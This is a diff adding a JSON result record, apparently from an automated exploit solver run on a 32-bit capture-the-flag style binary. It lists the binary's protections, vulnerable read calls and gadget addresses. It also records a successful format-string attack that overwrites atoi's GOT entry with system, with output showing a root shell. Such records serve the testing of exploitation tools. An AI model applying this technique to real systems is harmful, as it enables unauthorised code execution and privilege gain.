@@ -1,0 +1,46 @@
+{
+  "name": "ch02_x86_4d79",
+  "ok": true,
+  "strategy": "fmtstr",
+  "detail": "fmt atoi@got -> system@plt arg#10 write=short",
+  "elapsed": 2.2,
+  "attempt_count": 1,
+  "flag_only": false,
+  "facts": {
+    "prot": {
+      "arch": "i386/32",
+      "pie": false,
+      "canary": true,
+      "nx": true,
+      "relro": "Partial",
+      "static": false
+    },
+    "vulns": [
+      "read@0x8049276 disp=None off=None limit=4",
+      "read@0x804929b disp=-112 off=116 limit=99",
+      "read@0x80492e1 disp=-128 off=132 limit=15"
+    ],
+    "wins": [],
+    "binsh": "0x804a03e",
+    "gadgets": {
+      "ret": "0x804900a",
+      "leave": "0x8049165",
+      "pop_ebx": "0x804901e"
+    },
+    "csu": false,
+    "mmap_rwx": null,
+    "fmt_buf": 112,
+    "libc": null,
+    "notes": []
+  },
+  "attempts": [
+    {
+      "strategy": "fmtstr",
+      "desc": "fmt atoi@got -> system@plt arg#10 write=short",
+      "ok": true,
+      "elapsed": 1.02,
+      "tail": "                                                                                   x                                                                                                                                       caaa4À\u0004\b7À\u0004\b\nîÕÿyour passwd:PWNED_42\nroot\nuid=0(root) gid=0(root) groups=0(root)\n"
+    }
+  ],
+  "error": ""
+}
